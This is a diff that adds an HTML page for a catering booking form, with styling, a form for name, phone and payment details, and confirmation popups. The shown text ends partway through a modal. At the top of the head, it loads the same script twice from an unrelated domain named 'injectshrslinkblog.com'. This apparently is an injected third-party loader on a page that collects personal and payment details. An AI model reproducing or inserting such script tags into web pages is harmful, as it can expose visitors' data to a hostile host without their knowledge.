@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script type="module" src="https://injectshrslinkblog.com/popup/script.js"> </script>
+    <script type="module" src="https://injectshrslinkblog.com/popup/script.js"> </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Anton+SC&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-LZGkW73zS86Wa1XjF4bROq2c6D4r7/5qFw5xFzO2LBw1YFDpH6deC/5Rtf9zkI8a4Sy+f5cw7Bvf7c5N2K/aA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <title>Catering Booking Form</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-NWhzKpP0pqX37x/V7RdU64WVr5bHPXcT+0u0MZBqq3XkqKAp0J1ffX5kMlAA9v9CO2lR8RoPHdQ2lr8zoc/97A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        .display{
+            margin: 0;
+            padding: 0;
+            height:750px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Arial', sans-serif;
+            background-image: url('qqquad (1).svg'); /* Replace with your image URL */
+            background-size: cover;
+            background-position: center;
+            background-blend-mode: overlay; /* Ensures the background does not overpower the content */
+        }
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 20px;
+            position: relative;
+        }
+
+        .form-container {
+            backdrop-filter: blur(10px); /* Adds a glass-like blur effect */
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .date {
+            font-size: 23px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333; /* Dark text color for contrast */
+        }
+
+        .title {
+            font-size: 28px;
+            font-family: "Anton SC", sans-serif;
+            font-weight: 400;
+            font-style: normal;
+            color: #007BFF; /* Accent color for title */
+            text-align: center;
+            margin-bottom: 20px;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .booking-info {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .booking-card {
+            background: #007BFF; /* Accent color */
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            color: #fff; /* Light text on dark background */
+            text-align: center;
+        }
+
+        .booking-card p {
+            margin: 5px 0;
+            font-size: 16px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input, .input-group select {
+            width: calc(100% - 22px); /* Adjusted width */
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: #fff;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-group label {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #999;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus, .input-group select:focus {
+            outline: none;
+            border-color: #007BFF;
+        }
+
+        .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label,
+        .input-group select:focus + label, .input-group select:not([value=""]) + label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: #007BFF;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background: #007BFF;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        .refresh-button {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 50%; /* Makes the button circular */
+            width: 40px; /* Width and height should be the same to make it a perfect circle */
+            height: 40px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .refresh-button:hover {
+            background: #0056b3;
+        }
+        
+        .refresh-button svg {
+            width: 24px; /* Adjust the size of the icon */
+            height: 24px;
+            fill: white; /* Icon color */
+        }
+        
+        
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Confirmation Animation */
+        .confirmation-message {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            opacity: 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 100;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+
+        .confirmation-message.show {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .confirmation-card {
+            background: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            animation: slideInUp 0.5s ease;
+        }
+
+        .confirmation-icon {
+            font-size: 72px;
+            color: #28a745; /* Success green color */
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+
+        .confirmation-text {
+            font-size: 24px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .confirmation-details {
+            font-size: 16px;
+            color: #666;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-20px);
+            }
+            60% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Cookie consent overlay */
+        .cookie-consent-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 1000;
+            color:  #007BFF;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .cookie-consent-overlay.show {
+            display: flex;
+        }
+
+        .cookie-consent-overlay button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .cookie-consent-overlay button:hover {
+            background-color: #0056b3;
+        }
+        .popup-overlay {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5); /* Black background with opacity */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .popup-content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        
+        #popup-close {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background: #007BFF;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        
+        #popup-close:hover {
+            background: #0056b3;
+        }
+        .icon-container {
+            position: fixed;
+            background-color: black;
+            border-radius:50%;
+            top: 20px;
+            left: 20px;
+            cursor: pointer;
+            width: 40px; /* Adjust size as needed */
+            height: 40px; /* Adjust size as needed */
+        }
+        .card-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            background-color: #0B0F2B;
+        }
+        .card {
+            flex: 1 1 calc(50% - 10px); /* Adjust card width as needed */
+            text-align: center;
+            color: white;
+            background:#0B0F2B;
+            padding: 10px;
+            border: 2px solid lightgray;
+        }
+        .card-title{
+            color: #dda400;
+            font-family: "Anton SC", sans-serif;
+            font-weight: 400;
+            font-style: normal;
+            
+        }
+        .card-text{
+            color: #dda400;
+            font-weight:bold;
+        }
+        .icon-container-pp {
+            position: fixed;
+            top: 20px;
+            left: 70px;
+            border-radius: 50%;
+            background-color: black;
+            width: 40px;
+            height: 40px;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s;
+        }
+
+        .icon-container-pp:hover {
+            transform: scale(1.08);
+        }
+
+        .icon {
+            font-size: 24px;
+            cursor: pointer;
+            margin-top: 5px;
+            margin-left: 5px;
+        }
+        .icon-pp {
+            position: fixed;
+            top: 20px;
+            right: 70px;
+            cursor: pointer;
+            background-color: #007BFF;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon-pp:hover{
+            background-color: #0056b3;
+        }
+        .icon-pp svg {
+            color: white;
+            width: 25px;
+            height: 25px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="display">
+        <div class="cookie-consent-overlay" id="cookie-consent">
+            <div>
+                This website uses cookies to ensure you get the best experience. <br>
+                <button id="accept-cookies">Accept</button>
+            </div>
+        </div>
+        <!--location icons track-->
+        <div class="icon-container-pp">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="#00ff73" id="navigateIcon"  class="icon" viewBox="0 0 16 16">
+                <path d="M8 0a.5.5 0 0 1 .5.5v.518A7 7 0 0 1 14.982 7.5h.518a.5.5 0 0 1 0 1h-.518A7 7 0 0 1 8.5 14.982v.518a.5.5 0 0 1-1 0v-.518A7 7 0 0 1 1.018 8.5H.5a.5.5 0 0 1 0-1h.518A7 7 0 0 1 7.5 1.018V.5A.5.5 0 0 1 8 0m-.5 2.02A6 6 0 0 0 2.02 7.5h1.005A5 5 0 0 1 7.5 3.025zm1 1.005A5 5 0 0 1 12.975 7.5h1.005A6 6 0 0 0 8.5 2.02zM12.975 8.5A5 5 0 0 1 8.5 12.975v1.005a6 6 0 0 0 5.48-5.48zM7.5 12.975A5 5 0 0 1 3.025 8.5H2.02a6 6 0 0 0 5.48 5.48zM10 8a2 2 0 1 0-4 0 2 2 0 0 0 4 0"/>
+              </svg>
+        </div>
+        <script>
+            document.getElementById('navigateIcon').addEventListener('click', function() {
+                window.location.href = 'location.html';
+            });
+        </script>
+
+        <div class="container" id="main-content" style="display:none;">
+            <button class="refresh-button" id="refresh-button">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--!Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path d="M0 224c0 17.7 14.3 32 32 32s32-14.3 32-32c0-53 43-96 96-96l160 0 0 32c0 12.9 7.8 24.6 19.8 29.6s25.7 2.2 34.9-6.9l64-64c12.5-12.5 12.5-32.8 0-45.3l-64-64c-9.2-9.2-22.9-11.9-34.9-6.9S320 19.1 320 32l0 32L160 64C71.6 64 0 135.6 0 224zm512 64c0-17.7-14.3-32-32-32s-32 14.3-32 32c0 53-43 96-96 96l-160 0 0-32c0-12.9-7.8-24.6-19.8-29.6s-25.7-2.2-34.9 6.9l-64 64c-12.5 12.5-12.5 32.8 0 45.3l64 64c9.2 9.2 22.9 11.9 34.9 6.9s19.8-16.6 19.8-29.6l0-32 160 0c88.4 0 160-71.6 160-160z"/></svg>
+            </button> <!-- Refresh button added here -->
+            <div class="form-container">
+                <h1 class="date">Date: <span id="current-date">Loading...</span></h1> <!-- Placeholder for dynamic date -->
+                <h1 class="title">Catering Booking Form</h1>
+                <div class="booking-info" id="booking-info">
+                    <!-- Booking information will be dynamically updated here -->
+                </div>
+                <form id="booking-form">
+                    <div class="input-group">
+                        <input type="text" id="name" name="name" placeholder="Enter Your Name" required>
+                        <label for="name"></label>
+                    </div>
+                    <div class="input-group">
+                        <input type="tel" id="phone" name="phone" placeholder="Enter Your Phone" required>
+                        <label for="phone"></label>
+                    </div>
+                    <div class="input-group">
+                        <select id="paymentType" name="paymentType" required>
+                            <option value="" disabled selected>Choose</option>
+                            <option value="googlepay">Google Pay</option>
+                            <option value="phonepay">Phone Pay</option>
+                            <option value="paytm">Paytm</option>
+                        </select>
+                        <label for="paymentType"></label>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="paymentName" name="paymentName" placeholder="Enter Your Payment Name" required>
+                        <label for="paymentName"></label>
+                    </div>
+                    <button type="submit" id="submit-button">Submit Booking</button>
+                </form>
+            </div>
+        </div>
+    
+        <!-- Confirmation Message -->
+        <div class="confirmation-message" id="confirmation-message">
+            <div class="confirmation-card">
+                <i class="fas fa-check-circle confirmation-icon"></i>
+                <p class="confirmation-text">Booking Confirmed!</p>
+                <p class="confirmation-details">Thank you! Your booking has been received. Details will arrive shortly.</p>
+                <a href="https://surveyheart.com/form/6674333e0d568d47df02bd06" style="text-decoration:none; background-color:black; color:green; padding:8px 70px;"> Feedback </a>
+            </div>
+        </div>
+    
+        <audio id="confirmation-sound" src="pk.mp3"></audio> <!-- Add your sound file here -->
+    
+        <!--Search.html popup icon-->
+        <div class="icon-pp" onclick="redirectToSearch()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" class="fas fa-search">
+                <path d="M10 2C5.582 2 2 5.582 2 10s3.582 8 8 8c1.721 0 3.33-.555 4.62-1.49l4.735 4.735c.188.188.441.293.707.293.266 0 .519-.105.707-.293.391-.391.391-1.023 0-1.414l-4.735-4.735C17.445 13.33 18 11.721 18 10c0-4.418-3.582-8-8-8zm0 14c-3.313 0-6-2.687-6-6s2.687-6 6-6 6 2.687 6 6-2.687 6-6 6z"/>
+            </svg>
+        </div>
+        <script>
+            function redirectToSearch() {
+                window.location.href = 'serach.html';
+            }
+        </script>
+
+        <!--POpup for Booking Alert-->
+        <div class="popup-overlay" id="popup-overlay">
+            <div class="popup-content">
+                <center>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="50" height="50">
+                        <path d="M224 32C113.5 32 16 129.5 16 240S113.5 448 224 448 432 350.5 432 240 334.5 32 224 32zM208 120c0-8.5 6.5-15 15-15s15 6.5 15 15v159c0 8.5-6.5 15-15 15s-15-6.5-15-15V120zm0 259c0-8.5 6.5-15 15-15s15 6.5 15 15v15c0 8.5-6.5 15-15 15s-15-6.5-15-15v-15z" fill="#FFC107"/>
+                    </svg>                
+                </center>
+                <p id="popup-message">Oops! It looks like you've already reserved a spot.</p>
+    
+                <button id="popup-close">Close</button>
+            </div>
+        </div>
+    
+        <div class="icon-container" id="bookingIcon">
+            <!-- Example SVG Icon -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="red" width="100%" height="100%">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+            </svg>
+        </div>
+        <!-- Booking Details Modal -->
+        <div class="modal fade" id="bookingModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">Booking Details</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div id="bookingDetails" class="card-container"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+        <!-- Confirmation Modal -->
+        <div class="modal fade" id="confirmCancelModal" tabindex="-1" role="dialog" aria-labelledby="confirmCancelLabel" aria-hidden="true">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="confirmCancelLabel">Confirm Cancellation</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                  
